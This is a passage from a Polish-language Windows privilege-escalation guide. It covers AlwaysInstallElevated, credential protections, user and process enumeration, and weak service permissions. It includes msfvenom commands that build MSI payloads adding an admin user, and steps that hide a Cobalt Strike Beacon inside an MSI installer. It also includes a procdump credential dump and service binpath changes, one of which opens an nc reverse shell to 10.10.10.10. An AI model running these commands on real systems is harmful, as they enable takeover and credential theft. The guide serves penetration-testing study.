## AlwaysInstallElevated

**Jeśli** te 2 klucze rejestru są **włączone** (wartość **0x1**), użytkownicy z dowolnymi uprawnieniami mogą **instalować** (wykonywać) pliki `*.msi` jako NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Jeśli masz sesję Meterpretera, możesz zautomatyzować tę technikę za pomocą modułu **`exploit/windows/local/always_install_elevated`**

### PowerUP

Użyj polecenia `Write-UserAddMSI` z PowerUp, aby utworzyć w bieżącym katalogu plik binarny MSI systemu Windows służący do eskalacji uprawnień. Ten skrypt zapisuje prekompilowany instalator MSI, który wyświetla monit o dodanie użytkownika/grupy (dlatego potrzebny będzie dostęp do GUI):

```
Write-UserAddMSI
```

Po prostu uruchom utworzony plik binarny, aby eskalować uprawnienia.

### MSI Wrapper

Przeczytaj ten samouczek, aby dowiedzieć się, jak utworzyć MSI wrapper przy użyciu tych narzędzi. Pamiętaj, że możesz opakować plik „**.bat**”, jeśli chcesz **tylko** **wykonywać** **polecenia**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Tworzenie MSI za pomocą WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Tworzenie MSI za pomocą Visual Studio

- Wygeneruj za pomocą Cobalt Strike lub Metasploit nowy **Windows EXE TCP payload** w `C:\privesc\beacon.exe`
- Otwórz **Visual Studio**, wybierz **Create a new project** i wpisz „installer” w polu wyszukiwania. Wybierz projekt **Setup Wizard** i kliknij **Next**.
- Nadaj projektowi nazwę, np. **AlwaysPrivesc**, jako lokalizacji użyj **`C:\privesc`**, zaznacz **place solution and project in the same directory**, a następnie kliknij **Create**.
- Klikaj **Next**, aż dojdziesz do kroku 3 z 4 (wybór plików do uwzględnienia). Kliknij **Add** i wybierz właśnie wygenerowany payload Beacon. Następnie kliknij **Finish**.
- Zaznacz projekt **AlwaysPrivesc** w **Solution Explorer**, a następnie w **Properties** zmień **TargetPlatform** z **x86** na **x64**.
  - Możesz zmienić też inne właściwości, takie jak **Author** i **Manufacturer**, aby zainstalowana aplikacja wyglądała bardziej wiarygodnie.
- Kliknij projekt prawym przyciskiem myszy i wybierz **View > Custom Actions**.
- Kliknij prawym przyciskiem myszy **Install** i wybierz **Add Custom Action**.
- Kliknij dwukrotnie **Application Folder**, wybierz plik **beacon.exe** i kliknij **OK**. Dzięki temu payload Beacon zostanie uruchomiony natychmiast po uruchomieniu instalatora.
- W sekcji **Custom Action Properties** zmień **Run64Bit** na **True**.
- Na koniec **zbuduj projekt**.
  - Jeśli pojawi się ostrzeżenie `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, upewnij się, że platforma jest ustawiona na x64.

### Instalacja MSI

Aby **w tle** wykonać **instalację** złośliwego pliku `.msi`:

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Aby wykorzystać tę podatność, możesz użyć: _exploit/windows/local/always_install_elevated_

## Antywirusy i detektory

### Ustawienia audytu

Te ustawienia określają, co jest **rejestrowane**, więc należy zwrócić na nie uwagę.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding — warto wiedzieć, dokąd wysyłane są logi.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** służy do **zarządzania hasłami lokalnego Administratora**, zapewniając, że każde hasło jest **unikatowe, losowe i regularnie aktualizowane** na komputerach dołączonych do domeny. Hasła te są bezpiecznie przechowywane w Active Directory i mogą uzyskać do nich dostęp wyłącznie użytkownicy, którym przyznano odpowiednie uprawnienia za pomocą ACL, co pozwala im wyświetlać hasła lokalnego administratora, jeśli są do tego upoważnieni.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Jeśli jest aktywna, **hasła w postaci jawnego tekstu są przechowywane w LSASS** (Local Security Authority Subsystem Service).\
[**Więcej informacji o WDigest na tej stronie**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

Począwszy od **Windows 8.1**, Microsoft wprowadził rozszerzoną ochronę Local Security Authority (LSA), aby **blokować** próby **odczytu pamięci** tego procesu lub wstrzykiwania do niego kodu przez niezaufane procesy, dodatkowo zwiększając bezpieczeństwo systemu.\
[**Więcej informacji o LSA Protection znajdziesz tutaj**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** został wprowadzony w **Windows 10**. Jego zadaniem jest ochrona danych uwierzytelniających przechowywanych na urządzeniu przed zagrożeniami, takimi jak ataki pass-the-hash. [**Więcej informacji o Credential Guard znajdziesz tutaj.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Poświadczenia buforowane

**Poświadczenia domenowe** są uwierzytelniane przez **Local Security Authority** (LSA) i wykorzystywane przez składniki systemu operacyjnego. Gdy dane logowania użytkownika zostaną uwierzytelnione przez zarejestrowany pakiet zabezpieczeń, zazwyczaj ustanawiane są poświadczenia domenowe tego użytkownika.\
[**Więcej informacji o poświadczeniach buforowanych**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Użytkownicy i grupy

### Enumeruj użytkowników i grupy

Sprawdź, czy którakolwiek z grup, do których należysz, ma interesujące uprawnienia.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Grupy uprzywilejowane

Jeśli **należysz do jakiejś uprzywilejowanej grupy, możesz być w stanie eskalować uprawnienia**. Dowiedz się więcej o uprzywilejowanych grupach i o tym, jak je wykorzystać do eskalacji uprawnień:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipulacja tokenami

**Dowiedz się więcej** o tym, czym jest **token**, na tej stronie: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Zapoznaj się z poniższą stroną, aby **poznać interesujące tokeny** i dowiedzieć się, jak je wykorzystać:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Zalogowani użytkownicy / Sesje

```bash
qwinsta
klist sessions
```

### Katalogi domowe

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Polityka haseł

```bash
net accounts
```

### Pobierz zawartość schowka

```bash
powershell -command "Get-Clipboard"
```

## Uruchomione procesy

### Uprawnienia do plików i folderów

Przede wszystkim podczas wyświetlania listy procesów **sprawdź, czy w wierszu poleceń procesu nie ma haseł**.\
Sprawdź, czy możesz **nadpisać któryś z uruchomionych plików binarnych** lub czy masz uprawnienia do zapisu w folderze z plikami binarnymi, aby wykorzystać potencjalne ataki typu [**DLL Hijacking**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Zawsze sprawdzaj, czy nie działają [**debuggery electron/cef/chromium** — można je wykorzystać do eskalacji uprawnień](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

Listener debuggera może działać krótko, więc jego brak w pojedynczym pasywnym zrzucie portów nie dowodzi, że nigdy nie był dostępny. Powiąż każdy zaobserwowany listener z jego PID-em, właścicielem procesu i możliwością uzyskania do niego dostępu przez użytkownika o niższych uprawnieniach; sama nazwa aplikacji lub flaga debugowania nie potwierdza możliwości wykonywania kodu między kontami użytkowników. Rutynowe rozpoznanie prowadź pasywnie — nie wysyłaj poleceń debuggerowi.

**Sprawdzanie uprawnień do plików binarnych procesów**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Sprawdzanie uprawnień do folderów plików binarnych procesów (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Katalogi dynamicznych preprocessorów Snort

Snort 2 może ładować biblioteki współdzielone z katalogu `dynamicpreprocessor directory` zadeklarowanego w konfiguracji wskazanej za pomocą `snort.exe -c <config>`. W przypadku zaplanowanego zadania lub usługi uruchamiającej Snort na innym koncie sprawdź dokładnie tę konfigurację oraz ACL zadeklarowanego katalogu modułów. Jeśli Twój token pozwala tworzyć tam pliki, warto sprawdzić tę ścieżkę pod kątem code execution przy następnym ładowaniu modułów przez to zadanie lub usługę. Zweryfikuj efektywne uprawnienia konta używanego do uruchomienia, aktywną konfigurację, zgodność modułów oraz wszelkie ograniczenia typu deny lub ograniczenia udziału; sam zapis do katalogu nie dowodzi eskalacji. [Dokumentacja Snort dotycząca dynamic-preprocessor](https://www.snort.org/documents/dpx-readme) opisuje ładowanie modułów w czasie działania.

### Uprzywilejowana usługa internetowa z zapisywalnym katalogiem dokumentów

W instalacji Apache w systemie Windows porównaj ścieżkę pliku wykonywalnego usługi i konto używane do jej uruchomienia z wartością `DocumentRoot` w aktywnym pliku `httpd.conf`. W typowym układzie XAMPP sprawdź `C:\xampp\apache\conf\httpd.conf` oraz ACL skonfigurowanego katalogu dokumentów, często `C:\xampp\htdocs`. Jeśli użytkownik z niższymi uprawnieniami może tworzyć pliki w tym katalogu, a Apache działa jako `LocalSystem`, wykonanie kodu po stronie serwera może przekroczyć granicę uprawnień hosta. Potwierdź, że usługa działa, dokładna ścieżka jest udostępniana i odpowiedni handler po stronie serwera przetwarza dany typ pliku; sam zapis do katalogu dowodzi jedynie możliwości tworzenia plików. Sprawdź ACL bez zapisywania pliku testowego:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

W przypadku standardowej instalacji WAMP usługa może wskazywać wersjonowany plik `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (lub `C:\wamp\...` w układzie 32-bitowym), a konfiguracja może znajdować się obok, w `conf\httpd.conf`, z domyślnym katalogiem głównym `C:\wamp64\www` lub `C:\wamp\www`. Sprawdź łącznie dokładny plik wykonywalny usługi, tożsamość, z którą działa, efektywną wartość `DocumentRoot` (uwzględniając rozwinięcie `${INSTALL_DIR}` i nadpisania wirtualnych hostów) oraz ACL katalogu głównego. Możliwość zapisu w katalogu WAMP nie dowodzi, że Apache działa jako `SYSTEM` ani że wykona przesłany plik. [Apache dokumentuje, jak usługa Windows wybiera konfigurację](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Zapisywalny katalog główny IIS i tożsamość sieciowa puli aplikacji

W IIS przyporządkuj zapisywalny katalog fizyczny do **aktywnej witryny/aplikacji** w `applicationHost.config`, a następnie ustal skonfigurowaną pulę i handler po stronie serwera. Kod umieszczony w udostępnianym katalogu działa jako pula tylko wtedy, gdy IIS przetwarza dany typ pliku i można uzyskać dostęp do tej ścieżki. Zanim uznasz zapisywalny katalog za możliwość wykonania kodu, sprawdź efektywne uprawnienia bieżącego użytkownika do tworzenia plików, stan witryny w czasie działania, handler i nadpisania dla danej ścieżki.

Dynamiczna kompilacja ASP.NET wymaga sprawdzenia osobnej ścieżki: wygenerowanych plików w katalogu kompilacji aplikacji. Domyślnie jest to katalog `Temporary ASP.NET Files` w odpowiedniej instalacji .NET Framework, ale ustawienie aplikacji `<compilation tempDirectory>` może to zmienić. [Microsoft dokumentuje lokalizację i podkatalogi dla poszczególnych aplikacji](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) oraz [zaleca izolowanie katalogów kompilacji, gdy pule aplikacji nie ufają sobie nawzajem](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Jeśli token użytkownika o niższych uprawnieniach pozwala modyfikować wygenerowany kod źródłowy w pamięci podręcznej **konkretnej** aplikacji, ustal, czy aplikacja ponownie go skompiluje z tożsamością o wyższych uprawnieniach [procesu roboczego](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Sam ACL pliku lub katalogu nie dowodzi możliwości wykonania kodu: zweryfikuj powiązanie pamięci podręcznej z aktywną aplikacją, efektywny token i ACL, ustawienia kompilacji, tożsamość procesu oraz moment ewentualnej ponownej kompilacji. Korzystaj wyłącznie z przeglądu metadanych w trybie tylko do odczytu; podczas enumeracji nie uruchamiaj kompilacji ani nie modyfikuj plików pamięci podręcznej.

Pula IIS skonfigurowana jako `ApplicationPoolIdentity` lub `NetworkService` często uwierzytelnia się w zasobach domenowych jako **konto komputera hosta**, mimo że jej lokalny token może mieć niskie uprawnienia. `LocalSystem` ma już wysokie uprawnienia lokalne i również używa konta komputera w sieci; `LocalService` zwykle przedstawia anonimowe poświadczenia sieciowe. Pula `SpecificUser` używa skonfigurowanego dla niej konta. [Microsoft dokumentuje te typy tożsamości](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) oraz [tożsamość sieciową puli aplikacji](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Pominięte ustawienie tożsamości może dziedziczyć wartości domyślne puli, które różnią się w zależności od generacji IIS, dlatego ustal efektywną konfigurację, zamiast zgadywać na podstawie nazwy puli. Jeśli wykonanie kodu odbywa się w puli używającej tożsamości sieciowej komputera, oceń uprawnienia katalogowe **tego konkretnego komputera**. [DCSync](../active-directory-methodology/dcsync.md) wymaga uprawnień replikacji w kontekście nazewniczym domeny; sam bilet konta komputera lub rola hosta ich nie potwierdzają. Pasywna enumeracja powinna obejmować inspekcję konfiguracji i ACL bez przesyłania pliku, nawiązywania uwierzytelnienia sieciowego ani żądania biletów.

W przypadku dostępnego do odczytu handlera ASP.NET, który uruchamia proces pomocniczy, prześledź każdą wartość pochodzącą z żądania przez uwierzytelnianie, deszyfrowanie, walidację i konstruowanie polecenia. Handler, który konkatenacją wstawia zdekodowany token do `ProcessStartInfo("cmd", "/c ...")`, może umożliwiać metaznacnikom powłoki zmianę polecenia; [Microsoft dokumentuje znaki specjalne `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Ustal, czy niezaufany klient rzeczywiście może wpłynąć na zdekodowaną wartość i uzyskać dostęp do handlera, a następnie określ efektywną tożsamość puli aplikacji lub tożsamość podszywaną oraz tożsamość procesu potomnego. Dostępna linia kodu źródłowego, nasłuchujący localhost ani słabość formatu tokenu same w sobie nie dowodzą możliwości wykonania poleceń z podwyższonymi uprawnieniami. Przejrzyj kod źródłowy i konfigurację puli bez wysyłania sfałszowanych żądań ani uruchamiania procesu pomocniczego podczas pasywnej enumeracji.

W przypadku usługi PHP w systemie Windows ścieżka kontrolowana przez żądanie i przekazana do [`include` lub `require`](https://www.php.net/manual/en/function.include.php) może spowodować wykonanie zapisywalnego przez użytkownika o niższych uprawnieniach pliku PHP z tożsamością procesu roboczego. Potwierdź, że żądanie może dotrzeć do tej instrukcji, rozwiązywana ścieżka wskazuje plik, który użytkownik o niższych uprawnieniach może modyfikować, a proces roboczy odczytywać, obowiązujące ograniczenia ścieżek PHP zezwalają na dołączenie pliku, a proces roboczy rzeczywiście działa z wyższymi uprawnieniami. Nasłuchujący interfejs loopback ani sam zapisywalny plik nie potwierdzają tego łańcucha; podczas pasywnej enumeracji sprawdź kod źródłowy, tożsamość usługi i ACL pliku, nie wywołując endpointu.

### Wydobywanie haseł z pamięci

Możesz utworzyć zrzut pamięci działającego procesu za pomocą **procdump** z pakietu Sysinternals. Usługi takie jak FTP przechowują **poświadczenia w pamięci w postaci jawnego tekstu**; spróbuj zrzucić pamięć i odczytać poświadczenia.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Niebezpieczne aplikacje GUI

**Aplikacje działające jako SYSTEM mogą umożliwiać użytkownikowi uruchomienie CMD lub przeglądanie katalogów.**

Przykład: „Windows Help and Support” (Windows + F1), wyszukaj „command prompt”, kliknij „Click to open Command Prompt”

### Import plików projektów z podwyższonymi uprawnieniami

Aplikacja, która automatycznie otwiera projekty z katalogu, do którego użytkownik o niższych uprawnieniach może zapisywać, przekracza granicę zaufania danych wejściowych w kontekście konta importera. Sprawdź **dokładną ścieżkę z prawem zapisu**, proces lub zadanie, które ją otwiera, jego efektywną tożsamość oraz wersję parsera. [Historyczny problem Ghidra dotyczący otwierania/przywracania projektów](https://github.com/NationalSecurityAgency/ghidra/issues/71) umożliwiał użycie zewnętrznych encji XML w metadanych projektu; encja sieciowa w systemie Windows mogła spowodować uwierzytelnienie przy użyciu konta importera, jeśli pozwalały na to [zasady ruchu wychodzącego SMB i NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking). To trop wskazujący na możliwość ujawnienia poświadczeń, a nie bezpośredni dostęp administratora: odpowiedź musi dać się wykorzystać odrębną, autoryzowaną lub podatną ścieżką, a aktualne wersje należy ocenić pod kątem faktycznego stanu poprawek. Podczas pasywnej enumeracji nie otwieraj spreparowanego projektu; sprawdź przepływ importu i ACL.

## Usługi

Prawo [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) do obiektu Service Control Manager (SCM) jest odrębne od praw do istniejącej usługi. Pomyślne, tylko do odczytu żądanie dostępu [`OpenSCManager`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) z tym prawem jest tropem do weryfikacji, a nie dowodem, że nowa usługa może zostać uruchomiona. [`CreateService` zwraca uchwyt](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) z prawami dostępu do usługi żądanymi w chwili jej tworzenia; późniejsze ponowne otwarcie usługi powoduje odrębną kontrolę dostępu i może się nie powieść, nawet jeśli można użyć pierwotnego uchwytu. Osobno zweryfikuj efektywny token lokalny lub zdalny, przyznane prawa uchwytu, konto usługi, zasady uruchamiania i ścieżkę pliku wykonywalnego. Podczas pasywnej enumeracji nie twórz ani nie uruchamiaj usługi.

W przypadku zdalnej ścieżki instalacji usługi zestaw te prawa SCM z udziałem na celu, do którego **to samo logowanie sieciowe** może zapisywać, bazowym ACL NTFS tego udziału oraz lokalną ścieżką pliku wykonywalnego, który konto usługi może uruchomić. Konto niebędące administratorem może przekroczyć tę granicę, jeśli istnieją wyjątkowo szerokie prawa SCM i ścieżka umożliwiająca umieszczenie pliku; udział administracyjny nie jest warunkiem koniecznym. Sam dostęp do zapisu w udziale lub sam trop wskazujący na możliwość tworzenia usługi w SCM nie dowodzi, że nowa usługa może zostać uruchomiona z wyższą tożsamością.

Istniejąca usługa może wywoływać program pomocniczy podczas uruchamiania, zamykania lub innego zdarzenia cyklu życia, nawet jeśli tego programu nie ma w jej `ImagePath`. Jeśli nazwa programu pomocniczego jest rozwiązywana do katalogu, do którego użytkownik o niższych uprawnieniach może zapisywać, a usługa działa z wyższą tożsamością, brakujący plik pomocniczy może być kandydatem do warunkowej podmiany. Potwierdź **faktyczny kod usługi lub udokumentowane wywołanie programu pomocniczego**, rozwiązaną ścieżkę pliku wykonywalnego i kolejność wyszukiwania, prawa do tworzenia plików w katalogu, tożsamość usługi oraz dostępny wyzwalacz cyklu życia. Sam katalog usługi z prawem zapisu lub brakujący plik nie dowodzi, że usługa załaduje ten plik; podczas pasywnego przeglądu nie uruchamiaj ani nie zatrzymuj usługi.

W przypadku istniejącej usługi [`SERVICE_START` pozwala przekazywać argumenty do `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); jest to odrębne od [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Zanim uznasz prawo uruchamiania za coś więcej niż prawo do sterowania usługą, sprawdź jej kod lub udokumentowany interfejs. Jeśli usługa używa argumentu wybranego przez wywołującego jako ścieżki dziennika lub eksportu, zweryfikuj tożsamość usługi, dokładny przepływ argumentu do operacji zapisu, ograniczenia ścieżki oraz uprawnienia do **utworzonego pliku**. Zapis do chronionego katalogu może prowadzić do eskalacji tylko wtedy, gdy istnieje odrębny uprzywilejowany proces, który używa tego pliku; sam zapisywalny dziennik lub prawo uruchamiania nie wystarczą. Podczas pasywnej inwentaryzacji nie uruchamiaj usługi ani nie twórz pliku testowego.

W przypadku agenta monitorującego NSClient++ plik `nsclient.ini`, jeśli można go odczytać, jest **tropem do weryfikacji konfiguracji**: może zawierać poświadczenia do interfejsu WWW, a `boot.ini` może przekierowywać konfigurację do innej lokalizacji. Sprawdź faktyczne konto usługi, nasłuchujący interfejs WEB i zasady dostępu oraz to, czy uwierzytelniona rola może zmieniać ustawienia lub skrypty. Uprzywilejowane wykonanie wymaga dodatkowo `CheckExternalScripts` (lub innej włączonej ścieżki wykonania), skutecznego prawa do rejestrowania lub modyfikowania polecenia oraz wyzwalacza uruchamiającego je z tożsamością usługi. Interfejs nasłuchujący wyłącznie na loopback nadal może być dostępny dla użytkownika lokalnego, ale sama ścieżka pliku, hasło lub interfejs nasłuchujący nie potwierdzają istnienia tych praw. Podczas pasywnej enumeracji sprawdzaj metadane i uprawnienia bez wyświetlania sekretów ani wywoływania API WWW. Zobacz [układ plików NSClient++](https://nsclient.org/docs/concepts/file-layout/), [wskazówki dotyczące zabezpieczania interfejsu WWW i skryptów](https://nsclient.org/docs/setup/securing/) oraz [konfigurację skryptów zewnętrznych](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

W przypadku usługi, której `ImagePath` to `nssm.exe`, sprawdź rzeczywiste konto, z którego działa usługa, oraz wartość `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM przechowuje tam aplikację potomną](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), natomiast `AppDirectory` określa skonfigurowany katalog roboczy. Sprawdź plik wykonywalny aplikacji potomnej i ACL jej katalogu nadrzędnego, zanim uznasz, że uprawnienia wrappera wyznaczają całą granicę bezpieczeństwa usługi. Lokalny punkt końcowy WCF lub SOAP udostępniany przez tę aplikację to odrębny trop do weryfikacji: potwierdź, że użytkownik o niższych uprawnieniach może uzyskać dostęp do nasłuchującego punktu końcowego, dokładna operacja przyjmuje jego dane wejściowe, a aplikacja potomna usługi wykonuje niebezpieczną operację z wyższą tożsamością. Konto usługi, adres URL punktu końcowego lub zapisywalna ścieżka same w sobie nie dowodzą możliwości eskalacji; podczas pasywnej enumeracji nie wywołuj operacji usługi.

W przypadku niestandardowej operacji WCF prześledź przepływ ciągu znaków kontrolowanego przez wywołującego do dowolnego runspace PowerShell. [`Pipeline.Commands.AddScript` dodaje tekst skryptu](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), a [`Pipeline.Invoke` uruchamia pipeline](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [`netTcpBinding` z poświadczeniami transportu Windows](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) uwierzytelnia klienta, ale osobno należy sprawdzić uprawnienia do wywołania **konkretnej** operacji oraz efektywną tożsamość runspace. Przepływ danych wejściowych od wywołującego o niższych uprawnieniach do `AddScript` działającego z wyższą tożsamością usługi wyznacza granicę wykonania kodu; sam nasłuchujący port, uwierzytelniony klient lub niewykorzystywana metoda w niepowiązanym assembly nie stanowią dowodu. Statycznie sprawdź wdrożoną usługę, kontrakt, autoryzację i ustawienia impersonacji, nie wywołując punktu końcowego podczas enumeracji.

Wyzwalacze usług umożliwiają systemowi Windows uruchamianie usługi po wystąpieniu określonych warunków (aktywności nazwanego potoku lub punktu końcowego RPC, zdarzeń ETW, dostępności IP, podłączenia urządzenia, odświeżenia GPO itp.). Nawet bez praw SERVICE_START często można uruchomić uprzywilejowane usługi, wyzwalając ich mechanizmy. Techniki enumeracji i aktywacji znajdziesz tutaj:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Usługa kolektora diagnostycznego Visual Studio

Instalacje Visual Studio z narzędziami C/C++ mogą zawierać `VSStandardCollectorService150` — usługę diagnostyczną skonfigurowaną do działania jako `LocalSystem`. W ramach [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) wykorzystano wyścig z junction i łączem object managera, aby przekierować reset DACL usługi. Wykazana eskalacja wymagała również dostępnej ścieżki naprawy MSI dla dostawcy WMI Visual Studio Setup oraz pliku docelowego `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Ten składnik naprawiono w styczniu 2024 r.

Podczas pasywnej weryfikacji wstępnej sprawdź konto i ścieżkę pliku binarnego tej jednej usługi, sprawdź, czy istnieje ścieżka kompilatora Setup WMI, oraz zweryfikuj stan poprawek zainstalowanego składnika. Sam wpis usługi, wersja produktu Visual Studio lub plik kompilatora nie dowodzą, że host jest podatny. Sprawdzenie nie wymaga uruchamiania usługi ani wykonywania naprawy.

Pobierz listę usług:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Uprawnienia

Możesz użyć **sc**, aby uzyskać informacje o usłudze.

```bash
sc qc <service_name>
```

Zaleca się posiadanie pliku binarnego **accesschk** z _Sysinternals_, aby sprawdzić wymagany poziom uprawnień dla każdej usługi.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Zaleca się sprawdzić, czy grupa „Authenticated Users” może modyfikować jakąkolwiek usługę:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Możesz pobrać accesschk.exe dla XP stąd](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Włącz usługę

Jeśli pojawia się ten błąd (na przykład w przypadku SSDPSRV):

_Błąd systemu 1058._\
_Usługa nie może zostać uruchomiona, ponieważ jest wyłączona lub nie ma skojarzonych z nią włączonych urządzeń._

Możesz ją włączyć za pomocą

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Należy pamiętać, że usługa upnphost wymaga do działania usługi SSDPSRV (w przypadku XP SP1).**

**Innym sposobem obejścia tego problemu** jest uruchomienie:

```
sc.exe config usosvc start= auto
```

### **Modyfikowanie ścieżki pliku binarnego usługi**

Jeśli grupa „Użytkownicy uwierzytelnieni” ma uprawnienie **SERVICE_ALL_ACCESS** do usługi, można zmodyfikować jej plik wykonywalny. Aby zmodyfikować i uruchomić **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Ponowne uruchomienie usługi

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Uprawnienia można eskalować za pomocą różnych uprawnień:

- **SERVICE_CHANGE_CONFIG**: Umożliwia rekonfigurację pliku binarnego usługi.
- **WRITE_DAC**: Umożliwia rekonfigurację uprawnień, co pozwala zmieniać konfigurację usługi.
- **WRITE_OWNER**: Umożliwia przejęcie własności i rekonfigurację uprawnień.
- **GENERIC_WRITE**: Zapewnia również możliwość zmiany konfiguracji usługi.
- **GENERIC_ALL**: Zapewnia również możliwość zmiany konfiguracji usługi.

Do wykrywania i wykorzystania tej podatności można użyć _exploit/windows/local/service_permissions_.

### Słabe uprawnienia do plików binarnych usług

Jeśli usługa działa jako **`LocalSystem`**, **`LocalService`**, **`NetworkService`** lub uprzywilejowane konto domenowe, ale **użytkownicy z niskimi uprawnieniami mogą modyfikować plik EXE usługi lub jego folder nadrzędny**, często można przejąć kontrolę nad usługą, **zastępując plik binarny i ponownie uruchamiając usługę**.

